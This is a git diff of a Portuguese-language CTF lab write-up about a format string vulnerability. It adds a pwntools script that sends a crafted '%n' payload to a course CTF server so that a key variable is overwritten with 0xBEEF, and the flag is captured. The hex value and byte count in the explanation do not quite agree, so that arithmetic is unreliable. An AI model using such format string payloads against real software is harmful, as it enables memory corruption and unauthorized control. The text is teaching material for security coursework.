@@ -95,14 +95,14 @@ Isto é ligeiramente problemático, pois para escrever nesse endereço fariamos 
 p.sendline(b"AAAA\x20\xb3\x04\x08.48871x%n")
 ```
 
-No entanto, o `\x20` é o valor hexadecimal para o espaço, e o **p.sendline()** acaba quando recebe um espaço, portanto temos que ....
+No entanto, o `\x20` é o valor hexadecimal para o espaço, e o **p.sendline()** acaba quando recebe um espaço, portanto, para escrevermos naquele endereço vamos começar a escrever no endereço diretamente anterior a esse dados aleatórios e o resto da mensagem será escrita no endereço correto.<br>
+Nós decidimos escrever **0xBEFFFF**, portanto teremos de escrever 12513279 bytes. Como já escrevemos 4 bytes no **AAAA** e mais 4 bytes para o endereço  **0x804b31f**, então `N => 12513279 - 4 - 4 = 12513271`.
 
 
 ```py
 from pwn import *
 
 LOCAL = False
-
 if LOCAL:
     p = process("./program")
     """
@@ -118,8 +118,13 @@ if LOCAL:
 else:    
     p = remote("ctf-fsi.fe.up.pt", 4008)
 
-p.recvuntil(b"got:")
-p.sendline(b"AAAA\x24\xb3\x04\x08.48871x%n")
+p.recvuntil(b"here...")
+p.sendline(b"AAAA\x1f\xb3\x04\x08%.12513271x%n")
 p.interactive()
 ```
 
+Desta forma, o endereço **0x804b31f**, que está diretamente acima na stack em relação ao endereço **0x804b320**, e o valor da key terá **0xBEEF**.
+
+![image](/Semana_7/images/flaghard.png)
+
+Com isto, conseguimos obter a flag.
